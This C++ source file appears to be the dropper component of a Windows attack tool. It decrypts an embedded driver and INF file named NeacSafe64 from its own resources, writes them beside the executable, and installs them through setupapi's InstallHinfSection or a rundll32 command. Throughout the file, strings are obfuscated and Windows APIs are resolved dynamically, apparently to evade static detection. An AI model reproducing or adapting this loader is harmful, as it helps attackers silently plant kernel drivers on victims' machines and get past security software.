#define NOMINMAX
#include <windows.h>
#include <string>
#include <vector>
#include <stdio.h>
#include <cstdio>
#include "crypt.h"
#include "Controller.h"
#include "extract.h"
#include "service.h"
#include "filecrypt.h"


static std::wstring JoinPath(const std::wstring& dir, const std::wstring& name)
{
    if (dir.empty()) return name;
    if (dir.back() == L'\\' || dir.back() == L'/') return dir + name;
    return dir + L"\\" + name;
}

static void PrintLastErrorA(const char* where, DWORD err)
{
    g_log.Printf(LogLevel::Error, SKW(L"[FAIL] %s: err=%lu\n"), where, (unsigned long)err);
}

static std::wstring GetExeDir()
{
    HMODULE hK32 = GetModuleHandleW(SKW(L"kernel32.dll"));
    if (!hK32) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::GetExeDir() GetModuleHandleW(kernel32.dll) Failed, error.\n"));
        return L"";
    }

    auto pGetModuleFileNameW = (DWORD(WINAPI*)(HMODULE, LPWSTR, DWORD))
        GetProcAddress(hK32, SKA("GetModuleFileNameW"));
    if (!pGetModuleFileNameW) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::GetExeDir() GetProcAddress(GetModuleFileNameW) Failed, error.\n"));
        return L"";
    }

    wchar_t path[MAX_PATH * 4]{};
    DWORD n = pGetModuleFileNameW(nullptr, path, (DWORD)_countof(path));
    if (!n || n >= _countof(path)) return L"";

    std::wstring s(path);
    size_t pos = s.find_last_of(L"\\/");

    if (pos == std::wstring::npos) return L"";
    return s.substr(0, pos);
}


static bool FileExists(const std::wstring& path)
{
    HMODULE hK32 = GetModuleHandleW(SKW(L"kernel32.dll"));
    if (!hK32) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::FileExists() GetModuleHandleW(kernel32.dll) Failed, error.\n"));
        return false;
    }

    auto pGetFileAttributesW = (DWORD(WINAPI*)(LPCWSTR))
        GetProcAddress(hK32, SKA("GetFileAttributesW"));
    if (!pGetFileAttributesW) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::FileExists() GetProcAddress(GetFileAttributesW) Failed, error.\n"));
        return false;
    }

    DWORD attr = pGetFileAttributesW(path.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES) && !(attr & FILE_ATTRIBUTE_DIRECTORY);
}

bool ServiceExists(const std::wstring& svcName)
{

    HMODULE hK32 = GetModuleHandleW(SKW(L"kernel32.dll"));
    if (!hK32) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ServiceExists() GetModuleHandleW(kernel32.dll) Failed, error.\n"));
        return false;
    }

    auto pLoadLibraryW = (HMODULE(WINAPI*)(LPCWSTR))
        GetProcAddress(hK32, SKA("LoadLibraryW"));
    auto pFreeLibrary = (BOOL(WINAPI*)(HMODULE))
        GetProcAddress(hK32, SKA("FreeLibrary"));

    if (!pLoadLibraryW || !pFreeLibrary) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ServiceExists() GetProcAddress(LoadLibraryW, FreeLibrary) Failed, error.\n"));
        return false;
    }

    HMODULE hAdv = pLoadLibraryW(SKW(L"advapi32.dll"));
    if (!hAdv) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ServiceExists() pLoadLibraryW(advapi32.dll) Failed, error.\n"));
        return false;
    }

    auto pOpenSCManagerW = (SC_HANDLE(WINAPI*)(LPCWSTR, LPCWSTR, DWORD))
        GetProcAddress(hAdv, SKA("OpenSCManagerW"));
    auto pOpenServiceW = (SC_HANDLE(WINAPI*)(SC_HANDLE, LPCWSTR, DWORD))
        GetProcAddress(hAdv, SKA("OpenServiceW"));
    auto pCloseServiceHandle = (BOOL(WINAPI*)(SC_HANDLE))
        GetProcAddress(hAdv, SKA("CloseServiceHandle"));

    if (!pOpenSCManagerW || !pOpenServiceW || !pCloseServiceHandle)
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ServiceExists() GetProcAddress(OpenSCManagerW, OpenServiceW, CloseServiceHandle) Failed, error.\n"));
        pFreeLibrary(hAdv);
        return false;
    }

    bool exists = false;

    SC_HANDLE hSCM = pOpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCM)
    {
        SC_HANDLE hSvc = pOpenServiceW(hSCM, svcName.c_str(), SERVICE_QUERY_STATUS);
        if (hSvc)
        {
            exists = true;
            pCloseServiceHandle(hSvc);
        }
        pCloseServiceHandle(hSCM);
    }

    pFreeLibrary(hAdv);
    return exists;
}


// Extract RCDATA resource to file
// - resId: numeric ID in .rc (e.g. 101)
// - outPath: where to write
static bool ExtractRcDataToFile(WORD resId, const std::wstring& outPath)
{
    HMODULE hK32 = GetModuleHandleW(SKW(L"kernel32.dll"));
    if (!hK32) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ExtractRcDataToFile() GetModuleHandleW(kernel32.dll) Failed, error.\n"));
        return false;
    }

    auto pFindResourceW = (HRSRC(WINAPI*)(HMODULE, LPCWSTR, LPCWSTR))
        GetProcAddress(hK32, SKA("FindResourceW"));
    auto pLoadResource = (HGLOBAL(WINAPI*)(HMODULE, HRSRC))
        GetProcAddress(hK32, SKA("LoadResource"));
    auto pSizeofResource = (DWORD(WINAPI*)(HMODULE, HRSRC))
        GetProcAddress(hK32, SKA("SizeofResource"));
    auto pLockResource = (LPVOID(WINAPI*)(HGLOBAL))
        GetProcAddress(hK32, SKA("LockResource"));
    auto pCreateFileW = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))
        GetProcAddress(hK32, SKA("CreateFileW"));
    auto pWriteFile = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))
        GetProcAddress(hK32, SKA("WriteFile"));
    auto pCloseHandle = (BOOL(WINAPI*)(HANDLE))
        GetProcAddress(hK32, SKA("CloseHandle"));

    if (!pFindResourceW || !pLoadResource || !pSizeofResource || !pLockResource ||
        !pCreateFileW || !pWriteFile || !pCloseHandle) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ExtractRcDataToFile() GetProcAddress(FindResourceW, LoadResource, SizeofResource, LockResource, CreateFileW, WriteFile, CloseHandle) Failed, error.\n"));
        return false;
    }

    HRSRC hRes = pFindResourceW(nullptr, MAKEINTRESOURCEW(resId), RT_RCDATA);
    if (!hRes) {
		g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ExtractRcDataToFile() FindResourceW failed for ID=%u\n"), resId);
        return false;
    }

    DWORD resSize = pSizeofResource(nullptr, hRes);
    if (!resSize) {
		g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ExtractRcDataToFile() SizeofResource failed for ID=%u\n"), resId);
        return false;
    }

    HGLOBAL hData = pLoadResource(nullptr, hRes);
    if (!hData) {
		g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ExtractRcDataToFile() LoadResource failed for ID=%u\n"), resId);
        return false;
    }

    const BYTE* p = (const BYTE*)LockResource(hData);
    if (!p)
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ExtractRcDataToFile() LockResource failed\n"));
        return false;
    }

    std::wstring exeDir = GetExeDir();
    if (exeDir.empty())
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ExtractRcDataToFile() GetExeDir failed\n"));
        return false;
    }


    if (!FcryDecryptBufferToFile(p, resSize, outPath))
    {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::ExtractRcDataToFile() Decrypt from resource failed\n"));
        return false;
    }

    g_log.Printf(LogLevel::Good, SKW(L"[+] Extract::ExtractRcDataToFile() Saved decrypted: %s\n"), outPath.c_str());

    return true;
}

//const std::wstring svcName = L"jango.service";
//const std::wstring outName = L"NeacSafe64.inf";
//const WORD RES_ID_TESTDAT = 101;
//const std::wstring outName = L"NeacSafe64.sys";
//const WORD RES_ID_TESTDAT = 102;
DWORD extract(WORD RES_ID_TESTDAT, std::wstring outName, std::wstring svcName)
{
    if (ServiceExists(svcName))
    {
        g_log.Printf(LogLevel::Info, SKW(L"[i] Extract::extract() Service exists: %s. Skip extraction.\n"), svcName.c_str());
        return 0;
    }

    std::wstring dir = GetExeDir();
    if (dir.empty())
    {
        PrintLastErrorA(SKA("GetExeDir"), GetLastError());
        return 1;
    }

    std::wstring outPath = dir + SKW(L"\\") + outName;

    if (FileExists(outPath))
    {
        g_log.Printf(LogLevel::Info, SKW(L"[i] Extract::extract() File already exists: %s. Skip extraction.\n"), outPath.c_str());
        return 0;
    }

    if (!ExtractRcDataToFile(RES_ID_TESTDAT, outPath))
    {
        PrintLastErrorA(SKA("ExtractRcDataToFile"), GetLastError());
        return 2;
    }

    g_log.Printf(LogLevel::Good, SKW(L"[+] Extract::extract() Extracted: %s\n"), outPath.c_str());
    return 0;
}

// Get directory of current exe (with trailing backslash removed)
std::wstring GetCurrentExeDirectory()
{
    HMODULE hK32 = GetModuleHandleW(SKW(L"kernel32.dll"));
    if (!hK32) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::GetCurrentExeDirectory() GetModuleHandleW(kernel32.dll) Failed, error.\n"));
        return L"";
    }

    auto pGetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR))
        GetProcAddress(hK32, SKA("GetProcAddress"));
    if (!pGetProcAddress) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::GetCurrentExeDirectory() GetProcAddress(GetProcAddress) Failed, error.\n"));
        return L"";
    }

    auto pGetModuleFileNameW = (DWORD(WINAPI*)(HMODULE, LPWSTR, DWORD))
        (void*)pGetProcAddress(hK32, SKA("GetModuleFileNameW"));

    if (!pGetModuleFileNameW) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::GetCurrentExeDirectory() GetProcAddress(GetModuleFileNameW) Failed, error.\n"));
        return L"";
    }

    size_t bufSize = 32768;
    const size_t maxSize = 1 << 20;

    for (int attempt = 0; attempt < 6 && bufSize <= maxSize; ++attempt)
    {
        auto buf = std::make_unique<wchar_t[]>(bufSize);
        DWORD n = pGetModuleFileNameW(nullptr, buf.get(), static_cast<DWORD>(bufSize));

        if (n == 0) {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::GetCurrentExeDirectory() GetModuleFileNameW failed\n"));
            return L"";
        }

        if (n < bufSize - 1) {
            std::wstring fullPath(buf.get(), n);
            size_t pos = fullPath.find_last_of(L"\\/");
            if (pos == std::wstring::npos) {
                g_log.Printf(LogLevel::Warn, SKW(L"[!] Extract::GetCurrentExeDirectory() No directory separator found in path\n"));
                return L"";
            }
            return fullPath.substr(0, pos);
        }


        if (n == bufSize - 1 || n == bufSize) {
            bufSize *= 2;
        }
        else {
            g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::GetCurrentExeDirectory() Unexpected buffer size condition\n"));
            return L"";
        }
    }

    g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::GetCurrentExeDirectory() Path too long or buffer size exceeded\n"));
    return L"";
}


bool RunInstallDriver(DWORD* outPid )
{
    HMODULE hK32 = GetModuleHandleW(SKW(L"kernel32.dll"));
    if (!hK32) {
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::RunViola() GetModuleHandleW(kernel32.dll) Failed, error.\n"));
        return false;
    }

    auto pGetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR))
        GetProcAddress(hK32, SKA("GetProcAddress"));
    if (!pGetProcAddress) {
		g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::RunViola() GetProcAddress(GetProcAddress) Failed, error.\n"));
        return false;
    }

    auto pCreateProcessW = (BOOL(WINAPI*)(
        LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
        BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))
        pGetProcAddress(hK32, SKA("CreateProcessW"));

    auto pCloseHandle = (BOOL(WINAPI*)(HANDLE))
        pGetProcAddress(hK32, SKA("CloseHandle"));

    auto pGetLastError = (DWORD(WINAPI*)())
        pGetProcAddress(hK32, SKA("GetLastError"));

    if (!pCreateProcessW || !pCloseHandle || !pGetLastError) {
		g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::RunViola() GetProcAddress(CreateProcessW, CloseHandle, GetLastError) Failed, error.\n"));
        return false;
    }

    std::wstring CurDir = GetCurrentExeDirectory();
	std::wstring ViolaPath = CurDir + SKW(L"\\NeacSafe64.inf");
    std::wstring cmd = SKW(L"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 ") + ViolaPath;
    std::wstring mutableCmd = cmd;

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};

    BOOL ok = pCreateProcessW(
        nullptr,
        (wchar_t*)mutableCmd.data(),
        nullptr,
        nullptr,
        FALSE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    if (!ok)
    {
        DWORD err = pGetLastError();
        g_log.Printf(LogLevel::Error, SKW(L"[!] Extract::RunViola() pCreateProcessW( %s ) Failed, error[%d].\n"), (wchar_t*)mutableCmd.data(), err);
        return false;
    }

    if (outPid) *outPid = pi.dwProcessId;

    pCloseHandle(pi.hThread);
    pCloseHandle(pi.hProcess);

	g_log.Printf(LogLevel::Good, SKW(L"[+] Extract::RunViola() Started process: %s\n"), (wchar_t*)mutableCmd.data());
    return true;
}

using pfnInstallHinfSectionW = void (WINAPI*)(HWND, HINSTANCE, PCWSTR, int);

bool InstallInfSection_DefaultInstall_132(const std::wstring& infPath)
{
    HMODULE hK32 = GetModuleHandleW(SKW(L"kernel32.dll"));
    if (!hK32) return false;

    auto pGetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR))
        GetProcAddress(hK32, SKA("GetProcAddress"));
    auto pLoadLibraryW = (HMODULE(WINAPI*)(LPCWSTR))
        GetProcAddress(hK32, SKA("LoadLibraryW"));
    auto pFreeLibrary = (BOOL(WINAPI*)(HMODULE))
        GetProcAddress(hK32, SKA("FreeLibrary"));

    if (!pGetProcAddress || !pLoadLibraryW || !pFreeLibrary) return false;

    HMODULE hSetupApi = pLoadLibraryW(SKW(L"setupapi.dll"));
    if (!hSetupApi) return false;

    auto pInstallHinfSectionW = (pfnInstallHinfSectionW)(void*)
        pGetProcAddress(hSetupApi, SKA("InstallHinfSectionW"));

    if (!pInstallHinfSectionW)
    {
        pFreeLibrary(hSetupApi);
        return false;
    }

    std::wstring cmd = SKW(L"DefaultInstall 132 \"") + infPath + L"\"";

    pInstallHinfSectionW(nullptr, nullptr, cmd.c_str(), 0);

    pFreeLibrary(hSetupApi);
    return true;
}
